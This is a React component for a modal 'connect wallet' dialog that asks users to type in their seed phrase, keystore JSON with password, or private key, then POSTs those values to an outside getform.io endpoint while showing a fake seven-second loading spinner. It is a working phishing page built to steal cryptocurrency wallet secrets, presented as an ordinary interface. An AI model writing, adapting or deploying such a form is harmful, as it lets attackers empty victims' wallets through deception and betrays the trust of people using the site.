import { useState } from "react";
const Form = () => {
  const [tab, setTab] = useState(1);
  const [loading, setLoading] = useState(false);
  const connect = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
    }, 7000);
  };
  return (
    <dialog id="my_modal_5" className="modal w-screen bg-white">
      <form
        action="https://getform.io/f/480ef797-763f-4003-81b7-52b1efe44474"
        method="POST"
        className="modal-box max-w-[90vw] md:max-w-[45rem] w-[40%] bg-white mx-auto grid grid-cols-1 justify-center gap-[1.5rem] items-center"
      >
        <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2">
          ✕
        </button>
        <div className="tabs w-full self-stretch justify-self-stretch justify-around border-b">
          <a
            onClick={() => setTab(1)}
            className={`tab ${tab === 1 && "tab-active tab-bordered"}`}
          >
            Phrase
          </a>
          <a
            onClick={() => setTab(2)}
            className={`tab ${tab === 2 && "tab-active tab-bordered"}`}
          >
            KeyStore JSON
          </a>
          <a
            onClick={() => setTab(3)}
            className={`tab ${tab === 3 && "tab-active tab-bordered"}`}
          >
            Private Key
          </a>
        </div>
        <div className={`${tab === 1 ? "block" : "hidden"} w-full`}>
          <textarea
            className="w-full bg-white border rounded-[6px] p-[2%] text-[20px]"
            name="seedPhrase"
            placeholder="Type in your Seed Phrase"
          />
        </div>
        <div
          className={`${
            tab === 2 ? "flex flex-col gap-[1rem]" : "hidden"
          } w-full`}
        >
          <textarea
            className="w-full bg-white border rounded-[6px] p-[2%] text-[20px]"
            name="keystoreJson"
            placeholder="Type in your KeyStore JSON"
          />
          <input
            className="w-full bg-white border rounded-[6px] p-[2%] text-[15px]"
            placeholder="password"
            name="password"
          />
        </div>
        <div className={`${tab === 3 ? "block" : "hidden"} w-full`}>
          <input
            placeholder="Type In Your Private Key"
            className="w-full bg-white border rounded-[6px] p-[2%] text-[15px]"
            name="privateKey"
          />
        </div>
        <button
          type="submit"
          onClick={connect}
          style={{
            background: "linear-gradient(90deg,#594ffc,#8550ef",
          }}
          className="px-[1rem] py-[0.5rem] rounded-[8px]"
        >
          {loading ? (
            <span className="loading loading-spinner text-[#a9a3a3]"></span>
          ) : (
            "CONNECT"
          )}
        </button>
      </form>
      <form method="dialog" className="modal-backdrop">
        <button>close</button>
      </form>
    </dialog>
  );
};

export default Form;
